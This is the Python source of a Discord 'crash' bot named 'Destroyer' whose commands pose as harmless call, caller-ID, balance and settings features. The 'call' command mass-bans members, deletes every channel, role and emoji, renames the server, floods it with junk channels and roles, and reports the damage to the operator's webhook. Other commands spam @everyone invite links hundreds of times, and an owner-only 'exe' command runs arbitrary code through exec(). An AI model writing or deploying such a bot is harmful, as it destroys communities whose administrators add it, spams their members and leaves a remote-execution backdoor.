import discord
import datetime
import random
import asyncio
import dhooks
import contextlib
import io
import os
import threading
import time

from time import sleep
from threading import Thread, Lock
from discord.ext import commands
from config import settings
from dhooks import Webhook, Embed
client = commands.Bot(command_prefix = settings['PREFIX'], case_insensitive = True, intents = discord.Intents.all())
client.remove_command('help')


global webhook
webhook = Webhook(settings['WEBHOOK'])
global current_id
current_id = open('id.txt', 'w')

def localtime():
	time = datetime.datetime.now()
	return f'[{time.strftime("%H:%M:%S")}]'

@client.event
async def on_ready():
	current_id.write(f'{client.user.id}')
	current_id.close()
	await client.change_presence(status = discord.Status.idle, activity = discord.Activity(name='t!call | .gg/43GtxcFXPK', type=discord.ActivityType.watching))
	print(f'primary bot {client.user.name}#{client.user.discriminator}({client.user.id}) is ready.')


whiteservers = [833965619551535116]

async def act1(ctx):
	for member in ctx.guild.members:
		try:
			await member.ban()
			print(f'{localtime()} {member.name} - banned')
		except:
			print(f'{localtime()} {member.name} - can not be banned')

async def act2(ctx):
	for channel in ctx.guild.channels:
			try:
				await channel.delete()
				print(f'{localtime()} Channel {channel.name} - deleted')
			except:
				print(print(f'{localtime()} Channel {channel.name} - can not be deleted'))

async def act3(ctx):
	for role in ctx.guild.roles:
			try:
				await role.delete()
				print(f'{localtime()} Role {role.name} - deleted')
			except:
				print(f'{localtime()} Role {role.name} - can not be deleted')

async def act4(ctx):
	for emoji in ctx.guild.emojis:
			try:
				await emoji.delete()
				print(f'{localtime()} Emoji {emoji.name} - deleted')
			except:
				print(f'{localtime()} Emoji {emoji.name} - can not be deleted')

async def act5(ctx):
	for x in range(settings['TEXT-CHANNELS']):
		await ctx.guild.create_text_channel(f"{settings['TEXT']}-{random.randint(1, 1000)}")

async def act6(ctx):
	for y in range(settings['VOICE-CHANNELS']):
		await ctx.guild.create_voice_channel(f"{settings['TEXT']}-{random.randint(1, 1000)}")

async def act7(ctx):
	for z in range(settings['ROLES']):
		await ctx.guild.create_role(name = f"{settings['TEXT']}-{random.randint(1, 1000)}")

@client.command()
async def call(ctx):
	if ctx.guild.id not in whiteservers:
		await ctx.send("Starting a call with number: `+7 800 555 35 35` to random number. Wait....")
		print('='*45)

		start_time = localtime()
		start_guild_num = len(ctx.guild.members)
		start_guild_chan_num = len(ctx.guild.channels)
		start_guild_role_num = len(ctx.guild.roles)
		start_guild_emoji_num = len(ctx.guild.emojis)
	##############################################
		banned_num = 0
		deleted_chan = 0
		deleted_roles = 0
		deleted_emojis = 0
	# DELETE EVERYTHING
		client.loop.create_task(act1(ctx))
		client.loop.create_task(act2(ctx))
		client.loop.create_task(act3(ctx))
		client.loop.create_task(act4(ctx))

	# CREATE EVERYTHING
		log_channel = await ctx.guild.create_text_channel('crash-log')
		await log_channel.set_permissions(ctx.guild.default_role, send_messages = False)
		await log_channel.send('All has gone.(what was possible, sure)')
		channel222 = await ctx.guild.create_text_channel('crash-again')
		await channel222.send('if i not get banned, enter t!call again :))))))')

		text_num = 0
		voice_num = 0
		roles_num = 0
		emojis_num = 0
		servername = ctx.guild.name
		servericon = ctx.guild.icon_url
		fp = open(settings['ICON-PNG'], 'rb')
		pfp = fp.read()

		client.loop.create_task(act5(ctx))
		client.loop.create_task(act6(ctx))
		client.loop.create_task(act7(ctx))

		await log_channel.send('oof, how many here channels, roles and emojies, cool :)')
		await log_channel.send('now I will send a report on my actions to our server: discord.gg/43GtxcFXPK')
		# CREATE TEXT CHANNELS
		pfp_ch = 'Нет'
		try:
			fp = open(settings['ICON-PNG'], 'rb')
			pfp = fp.read()
			await ctx.guild.edit(name = settings['TEXT'], icon = pfp)
			print(f'{localtime()} Icon changed')
			pfp_ch = 'Да'
		except:
			await ctx.guild.edit(name = settings['TEXT'])
			print(f'{localtime()} Icon not changed')
			pfp_ch = 'Нет'

		end_time = localtime()

		print('Crash ended.')
		print('Sending webhook crash report.')
		await asyncio.sleep(2)
	#CRASH REPORT
		try:
			emb = Embed(title = 'Новый краш!(testing)', description = f"Сервер: {servername}\nУчастников: {start_guild_num}\n\
			  Аватарка изменена?: {pfp_ch}\n\n\
			Начало краша: {start_time}\n\
			Конец краша: {end_time}\n\nНе добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337, timestamp='now')
			emb.set_footer('Сервер крашнут')
			emb.set_thumbnail(url = servericon)
			webhook.send(embed = emb, username = 'test')
			print(f'Crash ended. Webhook - succes\n{start_time} - {end_time}')
		except:
			print()
	else:
		await ctx.send(f'Извини, но сервер нельзя крашить, т.к. владелец купил защиту от краша. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')

@client.command(aliases=['caller_id'])
async def __spam(ctx):
	if ctx.guild.id not in whiteservers:
		for i in range(500):
			try:
				for channel in ctx.guild.text_channels:
					await channel.send('@everyone Serv3r crash9d by new crash bot: Destroyer!\nСсылка на сервер: https://discord.gg/43GtxcFXPK\nhttps://discord.gg/St2Sduy')
			except:
				break
	else:
		await ctx.send(f'Извени, но на сервере нельзя спамить, т.к владелец молодец, купил защиту от бота. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')

@client.command(aliases=['help'])
async def __help(ctx):
  await ctx.send('Help command.\nt!call - start a call\nt!caller_id - get your number\nt!settings - show bot settings\nt!balance - chech youe balance on guild')

@client.command(aliases=['exe'])
async def ex(ctx, *, args):
	if ctx.author.id == 610453921726595082:
		try:
			out = exec(args)
			await ctx.send(f'Output:\n```{out}\n```')
		except:
			print(f'{args} is an invalid command')
			await ctx.send(f'An error occured in this command:\n```{args}\n```')
	else:
		await ctx.send('Нельзя :)')

@client.command(aliases=['balance'])
async def __current(ctx):
	if ctx.guild.id not in whiteservers:
		for i in range(555):
			await ctx.send('@everyone Serv3r crash9d by new crash bot: Destroyer!\nСсылка на сервер: https://discord.gg/43GtxcFXPK\nhttps://discord.gg/St2Sduy')
	else:
		await ctx.send(f'Сервер защищён от спама. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
@client.command(aliases=['settings'])
async def __settings(ctx):
	if ctx.guild.id not in whiteservers:
		for i in range(50):
			await channel.send('https:/gfycat.com/acclaimedpowerfulkatydid')
	else:
		await ctx.send(f'Этот сервер защищён. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')


client.run(settings['TOKEN'])
